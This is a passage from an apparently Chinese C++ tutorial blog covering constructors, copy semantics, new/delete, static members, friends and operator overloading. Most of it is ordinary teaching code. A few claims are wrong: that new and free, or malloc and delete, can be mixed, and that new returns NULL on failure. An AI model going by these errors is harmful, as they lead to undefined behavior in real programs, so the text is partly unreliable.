href="#6-常量的引用" class="headerlink" title="6.常量的引用"></a><strong>6.常量的引用</strong></h3><h4 id="1-什么叫常量引用"><a href="#1-什么叫常量引用" class="headerlink" title="1.什么叫常量引用"></a><strong>1.什么叫常量引用</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;int main() &#123;   int a = 10;   const int &amp; x = a;    &#125;</code></pre><h4 id="2-常引用有什么用"><a href="#2-常引用有什么用" class="headerlink" title="2.常引用有什么用"></a><strong>2.常引用有什么用</strong></h4><p>常引用可以让变量有只读属性</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;int main() &#123;   int a = 10;   const int &amp; x = a;   x = 20;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">error: assignment of read-only reference &#39;x&#39;    x = 20;        ^</code></pre><h4 id="3-常引用的初始化有两种情况"><a href="#3-常引用的初始化有两种情况" class="headerlink" title="3.常引用的初始化有两种情况"></a><strong>3.常引用的初始化有两种情况</strong></h4><p><strong>1.用变量初始化常量引用</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;int main() &#123;   int a = 10;   const int &amp; x = a;&#125;</code></pre><p><strong>2.用字面量初始化常量引用</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;int main() &#123;   const int &amp; x = 10;&#125;</code></pre><p>按理讲常量是没有内存空间分配的，但是在这种情况下C++ 编译器会新创建一个内存空间，然后将这个常量放进去，再去引用</p><h2 id="六、C-对-C-的函数的扩展"><a href="#六、C-对-C-的函数的扩展" class="headerlink" title="六、C++ 对 C 的函数的扩展"></a><strong>六、C++ 对 C 的函数的扩展</strong></h2><h3 id="1-inline-内联函数"><a href="#1-inline-内联函数" class="headerlink" title="1.inline 内联函数"></a><strong>1.inline 内联函数</strong></h3><p>内联函数在C++ 中的作用就是代替 宏代码段的</p><h4 id="1-内联函数是什么样子的"><a href="#1-内联函数是什么样子的" class="headerlink" title="1.内联函数是什么样子的"></a><strong>1.内联函数是什么样子的</strong></h4><p>内联函数和普通函数的样子是一样的，就是在前面加一个 inline </p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;inline void test()&#123;//这里是内联函数    int a = 10;    cout &lt;&lt; &quot;a 的值是：&quot; &lt;&lt; a &lt;&lt;endl;&#125;int main() &#123;   test();&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">a 的值是：10</code></pre><blockquote><p><strong>注意：</strong></p><p>(1)inline int myfunc(int a, int b); 必须和函数的定义放在一起，不能提前声明 (2)C++<br>编译器会将内联函数进行内联编译（会直接将函数体插入函数调用的地方） (3)内联函数没有普通函数调用的 压栈 出栈 跳转 等额外开销<br>(4)内联函数是对编译器的一种请求，编译器可能会拒绝这种请求，<br>(5)C++编译器自带优化，有些函数可能不是内联函数，但是比编译器还是会将其当成内联函数编译<br>(6)内联函数的限制，内联函数中不能存在任何的循环语句，不能存在过多的条件判断语句</p></blockquote><h3 id="2-函数参数相关扩展"><a href="#2-函数参数相关扩展" class="headerlink" title="2.函数参数相关扩展"></a><strong>2.函数参数相关扩展</strong></h3><h4 id="1-默认参数"><a href="#1-默认参数" class="headerlink" title="1.默认参数"></a><strong>1.默认参数</strong></h4><p><strong>1.概念：</strong></p><p>C++ 可以在函数声明的时候给函数的参数指定一个默认值，当这个参数没有传值的时候就会用这个默认值</p><p><strong>2.函数默认参数的规则</strong></p><p>(1)只有参数列表后面部分的参数才能设置默认值<br>(2)一旦在一个函数参数中使用默认值，那这个参数后面的参数都必须使用默认值</p><h4 id="2-函数的占位参数"><a href="#2-函数的占位参数" class="headerlink" title="2.函数的占位参数"></a><strong>2.函数的占位参数</strong></h4><p><strong>1.概念：</strong></p><p>占位参数只有参数的类型声明，没有参数名的声明，一般情况下，函数内部不能使用占位参数，但是调用的时候参数的个数要写够</p><h4 id="3-默认参数和占位参数结合"><a href="#3-默认参数和占位参数结合" class="headerlink" title="3.默认参数和占位参数结合"></a><strong>3.默认参数和占位参数结合</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;void test(int a,int b, int = 0)&#123;    cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; &quot;b = &quot; &lt;&lt; b &lt;&lt;endl;&#125;int main() &#123;   test(1,2);&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">a = 1b = 2</code></pre><blockquote><p><strong>注意：</strong></p><p>(1)这样做是为以后的程序扩展留下线索 (2)兼容C中出现的</p></blockquote><h3 id="3-函数的重载"><a href="#3-函数的重载" class="headerlink" title="3.函数的重载"></a><strong>3.函数的重载</strong></h3><h4 id="1-概念："><a href="#1-概念：" class="headerlink" title="1.概念："></a><strong>1.概念：</strong></h4><p>用相同的函数名定义不同的函数（相同函数名和不同的参数搭配的时候含义是不同的）</p><h4 id="2-实现条件-至少满足下面一个"><a href="#2-实现条件-至少满足下面一个" class="headerlink" title="2.实现条件(至少满足下面一个)"></a><strong>2.实现条件(至少满足下面一个)</strong></h4><p>(1)函数参数个数不同<br>(2)函数参数类型不同<br>(3)函数参数顺序不同</p><h4 id="3-注意："><a href="#3-注意：" class="headerlink" title="3.注意："></a><strong>3.注意：</strong></h4><p>当函数重载遇到默认参数的时候会出现二义性，这个是不允许的</p><h4 id="4-函数重载遇上函数指针"><a href="#4-函数重载遇上函数指针" class="headerlink" title="4.函数重载遇上函数指针"></a><strong>4.函数重载遇上函数指针</strong></h4><p>我们知道，重载的函数特点是函数名是一样的，我们在使用函数指针的时候会只是将名字赋值给指针，那么我们还是在调用的时候根据函数的参数去区分究竟是哪个函数的</p><h2 id="七、C-的面向对象"><a href="#七、C-的面向对象" class="headerlink" title="七、C++ 的面向对象"></a><strong>七、C++ 的面向对象</strong></h2><h3 id="1-类的概念："><a href="#1-类的概念：" class="headerlink" title="1.类的概念："></a><strong>1.类的概念：</strong></h3><p>类的概念之前讲的太多了，这里就我的理解简单的说一下，类实际上就是 属性(变量) 和 方法(函数) 的一个整合体，代表的是一类事物（或者说是对一类事物的一种抽象）。一个类可以实例化多个对象。</p><h3 id="2-类的封装"><a href="#2-类的封装" class="headerlink" title="2.类的封装"></a><strong>2.类的封装</strong></h3><p>我对封装的理解就是将 方法和属性封装起来，给可信的人提供可信的接口调用内部的方法和属性（做到访问控制）</p><h3 id="3-类的访问控制修饰符"><a href="#3-类的访问控制修饰符" class="headerlink" title="3.类的访问控制修饰符"></a><strong>3.类的访问控制修饰符</strong></h3><p>(1)public : 可以在类的内部和外部访问<br>(2)private ：只能在类的内部访问，不能在外部访问<br>(3)protected: 能在自己和子类中访问</p><h3 id="4-struct-和-class-关键字的区别"><a href="#4-struct-和-class-关键字的区别" class="headerlink" title="4.struct 和 class 关键字的区别"></a><strong>4.struct 和 class 关键字的区别</strong></h3><p>用struct 关键字定义的类的属性默认是 public 的,class 默认是 private </p><h3 id="5-类的声明和实现分开"><a href="#5-类的声明和实现分开" class="headerlink" title="5.类的声明和实现分开"></a><strong>5.类的声明和实现分开</strong></h3><p><strong>示例代码：</strong></p><p><strong>MyTeacher.h</strong></p><pre><code class="hljs">#ifndef LEIDEFENGZHUANG_MYTEACHER_H#define LEIDEFENGZHUANG_MYTEACHER_Hclass MyTeacher &#123;private:    char m_name[64];    int m_age;public:    void setAge(int age);    int  getAge();&#125;;#endif //LEIDEFENGZHUANG_MYTEACHER_H</code></pre><p><strong>MyTeacher.cpp</strong></p><pre><code class="hljs">#include &quot;MyTeacher.h&quot;void MyTeacher::setAge(int age) &#123;    this-&gt;m_age = age;&#125;int MyTeacher::getAge() &#123;    return this-&gt;m_age;&#125;</code></pre><p> <strong>mian.cpp</strong></p><pre><code class="hljs">#include &quot;iostream&quot;#include &quot;MyTeacher.h&quot;using namespace std;int main() &#123;    MyTeacher t1;    t1.setAge(24);    cout &lt;&lt; &quot;t1 老师的年龄是：&quot; &lt;&lt; t1.getAge() &lt;&lt;endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">t1 老师的年龄是：24</code></pre><h3 id="6-对象的构造和析构"><a href="#6-对象的构造和析构" class="headerlink" title="6.对象的构造和析构"></a><strong>6.对象的构造和析构</strong></h3><h4 id="1-构造函数和析构函数的概念"><a href="#1-构造函数和析构函数的概念" class="headerlink" title="1.构造函数和析构函数的概念"></a><strong>1.构造函数和析构函数的概念</strong></h4><p><strong>1.构造函数：</strong></p><p>(1)C++ 中的类可以定义与类名相同的成员函数，这就是构造函数<br>(2)构造函数在定义的时候可能有参数<br>(3)构造函数没有任何类型的返回声明</p><p><strong>2.析构函数：</strong></p><p>析构函数是用来清理对象的 ，定义方法是  ~ClassName()</p><blockquote><p><strong>注意：</strong><br> (1)析构函数没有参数也没有返回类型的声明<br> (2)析构函数在对象被销毁的时候自动的调用</p></blockquote><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class Test&#123;public:    Test()&#123;        cout &lt;&lt; &quot;我是构造函数&quot; &lt;&lt;endl;    &#125;    ~Test()&#123;        cout &lt;&lt; &quot;我是析构函数&quot; &lt;&lt;endl;    &#125;&#125;;void objplay()&#123;    Test t1;&#125;int main() &#123;    objplay();    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">我是构造函数我是析构函数</code></pre><h4 id="2-有参数和无参数的构造函数"><a href="#2-有参数和无参数的构造函数" class="headerlink" title="2.有参数和无参数的构造函数"></a><strong>2.有参数和无参数的构造函数</strong></h4><p><strong>1.调用有参数的构造函数</strong></p><p>一共有三种方法</p><p><strong>1.括号法：</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class Test &#123;public:    int m_a;    int m_b;public:    Test() &#123;        cout &lt;&lt; &quot;我是无参数构造函数&quot; &lt;&lt; endl;    &#125;    Test(int a, int b) &#123;        m_a = a;        m_b = b;        cout &lt;&lt; &quot;我是有参数构造函数&quot; &lt;&lt; endl;    &#125;&#125;;int main() &#123;    Test t1(1,2);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">我是有参数构造函数</code></pre><p><strong>2.等于号法</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class Test &#123;public:    int m_a;    int m_b;public:    Test() &#123;        cout &lt;&lt; &quot;我是无参数构造函数&quot; &lt;&lt; endl;    &#125;    Test(int a, int b) &#123;        m_a = a;        m_b = b;        cout &lt;&lt; &quot;我是有参数构造函数&quot; &lt;&lt; endl;    &#125;    Test(int a ) &#123;        m_a = a;        cout &lt;&lt; &quot;我是有一个参数的构造函数&quot; &lt;&lt; endl;    &#125;&#125;;int main() &#123;    Test t1 = (1,2);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">我是有一个参数的构造函数</code></pre><blockquote><p><strong>注意：</strong></p><p>1.这里的 &#x3D; 已经不是我们认识的等于号，c++ U对等于号的功能进行了加强<br>2.这里的括号是括号表达式，表达式的结果是最后一个逗号后面的内容、</p></blockquote><p><strong>3.手动调用</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class Test &#123;public:    int m_a;    int m_b;public:    Test() &#123;        cout &lt;&lt; &quot;我是无参数构造函数&quot; &lt;&lt; endl;    &#125;    Test(int a, int b) &#123;        m_a = a;        m_b = b;        cout &lt;&lt; &quot;我是有两个参数构造函数&quot; &lt;&lt; endl;    &#125;    Test(int a ) &#123;        m_a = a;        cout &lt;&lt; &quot;我是有一个参数的构造函数&quot; &lt;&lt; endl;    &#125;&#125;;int main() &#123;    Test t1 = Test(1,2);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">我是有两个参数构造函数</code></pre><h4 id="3-copy-（赋值）构造函数"><a href="#3-copy-（赋值）构造函数" class="headerlink" title="3.copy （赋值）构造函数"></a><strong>3.copy （赋值）构造函数</strong></h4><p>赋值构造函数，就是用一个对象去初始化另一个对象</p><p><strong>1. copy 构造函数的第一种调用情况</strong></p><p>在用一个对象<strong>初始化</strong>另一个对象的时候（注意是初始化不是赋值）</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class Test &#123;public:    int m_a;    int m_b;public:    Test(int a, int b) &#123;        m_a = a;        m_b = b;        cout &lt;&lt; &quot;我是有两个参数构造函数&quot; &lt;&lt; endl;    &#125;    Test(const Test &amp; obj)&#123;        m_b = obj.m_b;        m_a = obj.m_a;        cout &lt;&lt; &quot;我是赋值构造函数&quot; &lt;&lt; endl;    &#125;&#125;;int main() &#123;    Test t0(2,3);    Test t1(1,2);    Test t2 = t1; // 这句话就是使用 t1 去初始化对象 t2    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">我是有两个参数构造函数我是有两个参数构造函数我是赋值构造函数</code></pre><p>虽然说是赋值构造函数，但是我们还是能进行一些个性化的操作</p><p><strong>比如像这样：</strong></p><pre><code class="hljs">   Test(const Test &amp; obj)&#123;        m_b = obj.m_b + 100;        m_a = obj.m_a + 100;        cout &lt;&lt; &quot;我是赋值构造函数&quot; &lt;&lt; endl;    &#125;</code></pre><p>上面那个是第一种方法，下面我们介绍第二种方法</p><p><strong>2. copy 构造函数的第二种调用情况</strong></p><p>和第一种是一种请款，但是属于两种不同的表示方法</p><p><strong>示例代码：</strong></p><pre><code class="hljs">int main() &#123;    Test t0(2,3);    Test t1(1,2);    Test t2(t1); // 这句话就是使用 t1 去初始化对象 t2    return 0;&#125;</code></pre><p><strong>3. copy 构造函数的第三种调用情况</strong></p><p>实参对象去初始化形参对象会调用赋值构造函数</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class Location&#123;private:    int X;    int Y;public:    Location(int xx,int yy)&#123;        X = xx;        Y = yy;        cout &lt;&lt; &quot;构造对象&quot; &lt;&lt;endl;    &#125;    Location(const Location &amp; p)&#123;        X = p.X;        Y = p.Y;        cout &lt;&lt; &quot;赋值构造语句&quot; &lt;&lt; endl;    &#125;    ~Location()&#123;        cout &lt;&lt; &quot;析构语句&quot; &lt;&lt;endl;    &#125;    int GETX()&#123;        return X;    &#125;;    int GETY()&#123;        return Y;    &#125;&#125;;void f(Location p)&#123;    cout &lt;&lt; p.GETX() &lt;&lt; endl;&#125;int main()&#123;    Location a(1,2);    f(a);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">构造对象赋值构造语句1析构语句析构语句</code></pre><p><strong>4. copy 构造函数的第四种调用情况</strong></p><p>这种方式和匿名对象有关</p><pre><code class="hljs">Location g()&#123;        Location A(1,2);    return A;&#125;</code></pre><p>这个函数返回的是一个对象A ，然后这个对象A 转化成一个匿名对象，这时候就会调用赋值（copy ）构造函数，而这个匿名对象究竟是否析构，关键看我们怎么接这个对象。</p><blockquote><p><strong>补充：有关匿名对象的去和留</strong></p><p>(1)如果用匿名对象初始话另一个同类型的对象，就相当于将匿名对象扶正，匿名对象不会析构<br>(2)如果用匿名对象给另一个同类型的对象赋值，那么相当于生成一个新的对象，匿名对象会被析构#### </p></blockquote><p><strong>4.构造函数的调用规则</strong></p><p>(1)没有定义构造函数的时候会调用m的构造函数<br>(2)没有定义赋值构造函数的时候会调用默认的赋值构造函数<br>(3)当类中定义了任意的非拷贝构造函数的时候，C++编译器便不提供默认构造函数（也就是你写了就必须给我用）</p><h4 id="4-对象的初始化列表"><a href="#4-对象的初始化列表" class="headerlink" title="4.对象的初始化列表"></a><strong>4.对象的初始化列表</strong></h4><p><strong>1.原因：</strong></p><p>如果我们有一个类的类成员，他本身就是一个类对象，并且这个类只有一个带参数的构造函数，没有默认的构造函数，那我们初始化外面这个类的对象的时候就需要调用里面这个类的带参数的构造函数，没有就会报错</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class A&#123;private:    int a;public:    A(int _a) &#123;        a = _a;    &#125;&#125;;class B&#123;private:    int b1;    int b2;    A a1;    A a2;public:&#125;;int main() &#123;    B objb;    return 0;&#125;</code></pre><p>于是 C++ 提供了初始化列表对成员变量进行初始化，语法规则如下：</p><pre><code class="hljs">Constructor::Constructor():m1(v1),m2(v1,v2),m3(v3)</code></pre><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class A&#123;private:    int a;public:    A(int _a) &#123;        a = _a;    &#125;&#125;;class B&#123;private:    int b1;    int b2;    A a1;    A a2;public:    B():a1(1),a2(2)&#123;// 注意这一行            &#125;&#125;;int main() &#123;    B objb;    return 0;&#125;</code></pre><blockquote><p><strong>补充:</strong></p><p>1.调用顺序，先执行里面的类的构造函数，然后再执行自己的构造函数，析构的顺序和构造相反<br>2.如果类里面const 属性的话，必须要在列表后加上这个的初始化<br>3.初始化列表不止在有参数和无参数后面可以跟，在赋值构造函数后面也可以跟</p></blockquote><h3 id="7-深拷贝和浅拷贝"><a href="#7-深拷贝和浅拷贝" class="headerlink" title="7.深拷贝和浅拷贝"></a><strong>7.深拷贝和浅拷贝</strong></h3><p>浅拷贝就是将指针变量指向的内存地址的值进行了拷贝，但是并没有对内存空间进行拷贝(也就是说，没有重新的开辟一块新的内存空间)</p><p>C++ 中，对象的初始化默认是浅拷贝，这就会出现一个非常严重的问题，当我们拷贝的某一个对象销毁的时候就会调用析构函数，析构函数就会将内存空间（这块内存空间是多个对象共用的）进行析构(销毁)，那么原始对象销毁的时候就销毁的是一个空的地址的值，这样就会出现 double free 的问题</p><p>解决方法就是手动写copy 函数，重新分配内存空间</p><blockquote><p><strong>注意：</strong></p><p>等号操作默认也是浅拷贝，解决方法就是显示的重载等号操作符（这个我们在后面会讲到）</p></blockquote><h3 id="8-对象的动态建立以及释放"><a href="#8-对象的动态建立以及释放" class="headerlink" title="8.对象的动态建立以及释放"></a><strong>8.对象的动态建立以及释放</strong></h3><h4 id="1-new-和-delete-的基本语法"><a href="#1-new-和-delete-的基本语法" class="headerlink" title="1.new 和 delete 的基本语法"></a><strong>1.new 和 delete 的基本语法</strong></h4><p><strong>1.概念：</strong></p><p>new 和 delete 是 C++ 的语法，很像 malloc 和 free (或者可以说是malloc 和 free 的简化，因为他们是操作符而不是函数)，C++ 中建议不要使用 malloc 和 free 而使用 new 和 delect ，  new 可以创建基础类型变量 、分配数组变量、分配类对象等</p><p>new int; &#x2F;&#x2F;就是开辟一个存放整数的存储空间，并且返回一个指向该空间的指针<br>new int(110); &#x2F;&#x2F;就是开辟一个存放整数的存储空间，并初始化为110，并且返回一个指向该空间的指针<br>new char[10]; &#x2F;&#x2F;开辟一个存放字符数组的空间，并返回首地址<br>float *p &#x3D; new float(3.1415926);</p><blockquote><p><strong>注意：</strong></p><p>1.new 和 malloc 一样，是动态分配堆内存<br>2.new 动态分配内存的时候如果分配的空间不足，就会分配失败返回一个NULL<br>3.用 new 分配数组空间的时候不能分配初始值</p></blockquote><p><strong>2.分配基础变量</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;int main() &#123;    //分配基础变量    int* p = new int(30);    cout &lt;&lt; &quot;*p 的值为： &quot; &lt;&lt; *p &lt;&lt; endl;    delete p;    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">*p 的值为： 30</code></pre><p><strong>2.分配数组变量</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;int main() &#123;    //分配数组    int * pArray = new int[10];    pArray[1] = 1;    delete [] pArray;    // 注意这里的删除方式 要加一个 []        return 0;&#125;    </code></pre><p> <strong>3.分配对象</strong>     </p><p> <strong>示例代码:</strong></p><pre><code class="hljs"> #include &quot;iostream&quot;using namespace std;class Test&#123;private:    int m_a;public:    Test(int a)&#123;        m_a = a;        cout &lt;&lt; &quot;构造函数&quot; &lt;&lt; endl;    &#125;    ~Test()&#123;        cout &lt;&lt; &quot;析构函数&quot; &lt;&lt; endl;    &#125;&#125;;int main() &#123;    //分配对象    Test *pT = new Test(10);    delete pT;    return 0;&#125;    </code></pre><p><strong>结果：</strong></p><pre><code class="hljs">构造函数析构函数</code></pre><h4 id="2-和-malloc-、free-的区别"><a href="#2-和-malloc-、free-的区别" class="headerlink" title="2.和 malloc() 、free() 的区别"></a><strong>2.和 malloc() 、free() 的区别</strong></h4><p>malloc 和 free 在分配对象内存的时候都不能自动调用构造和析构方法，但是 new 和 delete 可以，这说明 malloc 和 free 更加底层一点</p><p><strong>注意：</strong></p><p>new 的空间可以用 free 释放 同理，malloc的空间可以用 delete 释放</p><h2 id="八、静态成员变量和成员函数"><a href="#八、静态成员变量和成员函数" class="headerlink" title="八、静态成员变量和成员函数"></a><strong>八、静态成员变量和成员函数</strong></h2><h3 id="1-静态成员变量"><a href="#1-静态成员变量" class="headerlink" title="1.静态成员变量"></a><strong>1.静态成员变量</strong></h3><p>把一个类的成员生命成 static 时，这个类无论有多少个对象被创建，这些对象都共享这个 static  成员，准确的说静态成员是属于类的</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class B&#123;private:    int a;    int b;    static int c;public:&#125;;int B :: c = 10;//注意这里，静态属性一定要在类的外面单独声明int main() &#123;    B b1,b2,b3;    return 0;&#125;</code></pre><p>任何对象对静态属性的修改都将作用于全局</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class B&#123;private:    int a;    int b;    static int c;public:    void getC()&#123;        cout &lt;&lt; &quot;c :&quot; &lt;&lt; c &lt;&lt;endl;    &#125;    void addC()&#123;        c = c+1;    &#125;&#125;;int B :: c = 10;int main() &#123;    B b1,b2,b3;    b1.getC();    b2.addC();    b3.getC();    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">c :10c :11</code></pre><h3 id="2-静态成员方法"><a href="#2-静态成员方法" class="headerlink" title="2.静态成员方法"></a><strong>2.静态成员方法</strong></h3><p>静态成员函数提供不依赖于类数据结构的共同操作，没有this指针，外部调用的时候可以通过 类::类函数 的方式或者通过对象调用</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class B&#123;private:    int a;    int b;    static int c;public:    void getC()&#123;        cout &lt;&lt; &quot;c :&quot; &lt;&lt; c &lt;&lt;endl;    &#125;    void addC()&#123;        c = c+1;    &#125;    static void testC()&#123;        cout &lt;&lt; &quot;我是静态成员&quot; &lt;&lt; endl;    &#125;&#125;;int B :: c = 10;int main() &#123;    B b1,b2,b3;    b1.getC();    b2.addC();    b3.getC();    b3.testC();    B::testC();    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">c :10c :11我是静态成员我是静态成员</code></pre><p><strong>注意:</strong></p><p>静态成员变量中不能调用非静态属性或者函数，因为非静态的特定对象的，用静态的去调用就没法分清是属于哪个对象的，于是就会报错</p><h2 id="九、C-面向对象模型初探"><a href="#九、C-面向对象模型初探" class="headerlink" title="九、C++ 面向对象模型初探"></a><strong>九、C++ 面向对象模型初探</strong></h2><h3 id="1-问题抛出"><a href="#1-问题抛出" class="headerlink" title="1.问题抛出"></a><strong>1.问题抛出</strong></h3><p>当我们用一个具体的对象调用类中的某一个方法的时候 C++ 编译器是怎么知道是那一个类调用的哪一个方法呢？</p><h3 id="2-揭开面纱"><a href="#2-揭开面纱" class="headerlink" title="2.揭开面纱"></a><strong>2.揭开面纱</strong></h3><p>C++ 中的成员变量和成员函数是分开存储的</p><p><strong>1.成员变量：</strong></p><p>(1)普通成员变量：存储于对象中，与struct 对象有着相同的内存布局和字节对齐方式<br>(2)static 成员变量：存储在全局数据区中</p><p><strong>2.成员函数</strong></p><p>存储在代码段中</p><p>那么究竟是怎么区分不同对象对相同代码段的调用的呢？</p><p>答案是： this 指针，这个指针在方法中是隐藏的，但是不代表没有，用对象调用的时候就会把这个this 指针指向调用函数的变量</p><h3 id="3-this-指针"><a href="#3-this-指针" class="headerlink" title="3.this 指针"></a><strong>3.this 指针</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class B&#123;private:    int a;    int b;    public:        B(int a ,int b)&#123;        this-&gt;a = a;        this-&gt;b = b;    &#125;        &#125;;int main() &#123;    B test(1,2);    return 0;</code></pre><h3 id="4-修饰成员函数的const-修饰的是谁"><a href="#4-修饰成员函数的const-修饰的是谁" class="headerlink" title="4.修饰成员函数的const 修饰的是谁"></a><strong>4.修饰成员函数的const 修饰的是谁</strong></h3><p>修饰成员函数的const 可以放在这个函数后面，他修饰的都是 this 指针指向的内存空间，也就是属性不能修改</p><p><strong>示例代码：</strong></p><p>下面的代码会报错</p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class B&#123;private:    int a;    int b;public:    B(int a ,int b)&#123;        this-&gt;a = a;        this-&gt;b = b;    &#125;    void Test(int a ,int b) const&#123;        this-&gt;a = 100;        this-&gt;b = 300;    &#125;&#125;;int main() &#123;    B test(1,2);    test.Test(1,2);    return 0;&#125;</code></pre><h2 id="十、友元"><a href="#十、友元" class="headerlink" title="十、友元"></a><strong>十、友元</strong></h2><h3 id="1-友元函数："><a href="#1-友元函数：" class="headerlink" title="1.友元函数："></a><strong>1.友元函数：</strong></h3><h4 id="1-概念：-1"><a href="#1-概念：-1" class="headerlink" title="1.概念："></a><strong>1.概念：</strong></h4><p>友元函数是类中的一个全局函数，他是类的好朋友，通过他能修改类的私有属性(破坏了类的封装)，就和 JAVA 中的反射破坏了类的封装一样</p><p><strong>示例代码：</strong></p><p>下面的 test 函数在类的外面，是不能操纵类的私有属性的，于是会报错</p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class A&#123;private:    int a;    int b;public:    A(int a , int b)&#123;        this-&gt;a = a;        this-&gt;b = b;    &#125;&#125;;void test(A* pT)&#123;    cout &lt;&lt; pT-&gt;a &lt;&lt;endl;&#125;int main() &#123;    A t(1,2);    return 0;&#125;</code></pre><p>但是，如果我们在类里面将这函数声明为友元（类的好朋友），那么久不会报错了</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class A&#123;private:    int a;    int b;public:    friend void test(A* pT);    A(int a , int b)&#123;        this-&gt;a = a;        this-&gt;b = b;    &#125;&#125;;void test(A* pT)&#123;    cout &lt;&lt; pT-&gt;a &lt;&lt;endl;&#125;int main() &#123;    A t(1,2);    return 0;&#125;</code></pre><h3 id="2-友元类"><a href="#2-友元类" class="headerlink" title="2.友元类"></a><strong>2.友元类</strong></h3><h4 id="1-概念：-2"><a href="#1-概念：-2" class="headerlink" title="1.概念："></a><strong>1.概念：</strong></h4><p>如果类 B 是类 A 的好朋友，那么如果在类B 中有 A 对象，那么可以直接对七进行修改</p><blockquote><p><strong>注意：</strong></p><p>(1)如果 B 类是A 类的友元类，那么B中的所有成员函数都是A 的友元函数<br>(2)友元类通常设计为一种对数据操作或者类之间传递消息的辅助类</p></blockquote><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class A&#123;private:    int a;    int b;public:    friend class B; //注意这里将 B 定义为 A 的好朋友    A(int a , int b)&#123;        this-&gt;a = a;        this-&gt;b = b;    &#125;&#125;;class B&#123;    private:    A TestA;public:        void setA(int a )&#123;                TestA.a = a;    &#125;&#125;;int main() &#123;    A t(1,2);    return 0;&#125;</code></pre><h2 id="十一、运算符重载"><a href="#十一、运算符重载" class="headerlink" title="十一、运算符重载"></a><strong>十一、运算符重载</strong></h2><h3 id="1-为什么要运算符重载"><a href="#1-为什么要运算符重载" class="headerlink" title="1.为什么要运算符重载"></a><strong>1.为什么要运算符重载</strong></h3><p>对于基础的数据类型，编译器已经知道如何进行运算了，但是对于复杂的数据类型，编译器却不知道应该怎么办，于是我们就需要运算符的重载，这是C++ 编译器给我们提供的对自定义数据类型进行运算的方式</p><h3 id="2-如何实现："><a href="#2-如何实现：" class="headerlink" title="2.如何实现："></a><strong>2.如何实现：</strong></h3><p><strong>我们可以自定义一个函数实现这样的功能</strong>：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class Complex&#123;private:    int a;    int b;    friend Complex myAdd(Complex &amp; c1, Complex &amp; c2);public:        Complex(int a=0,int b =0)&#123;        this-&gt;a = a;        this-&gt;b = b;    &#125;    void printCom()&#123;        cout &lt;&lt; this-&gt;a &lt;&lt; &quot; + &quot; &lt;&lt; this-&gt;b &lt;&lt; &quot;i&quot; &lt;&lt;endl;    &#125;&#125;;Complex myAdd(Complex &amp; c1, Complex &amp; c2)&#123;    Complex tmp(c1.a+c2.a,c1.b+c2.b);    return tmp;&#125;int main() &#123;    Complex c1(1,2),c2(3,4);    Complex c4 = myAdd(c1,c2);    c4.printCom();    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">4 + 6i</code></pre><p><strong>然后我们使用 运算符重载技术</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class Complex&#123;private:    int a;    int b;    friend Complex operator+(Complex &amp; c1, Complex &amp; c2);public:    Complex(int a=0,int b =0)&#123;        this-&gt;a = a;        this-&gt;b = b;    &#125;    void printCom()&#123;        cout &lt;&lt; this-&gt;a &lt;&lt; &quot; + &quot; &lt;&lt; this-&gt;b &lt;&lt; &quot;i&quot; &lt;&lt;endl;    &#125;  &#125;;Complex operator+(Complex &amp; c1, Complex &amp; c2)&#123;    Complex tmp(c1.a+c2.a,c1.b+c2.b);    return tmp;&#125;int main() &#123;    Complex c1(1,2),c2(3,4);    Complex c4 = c1 + c2;    c4.printCom();    return 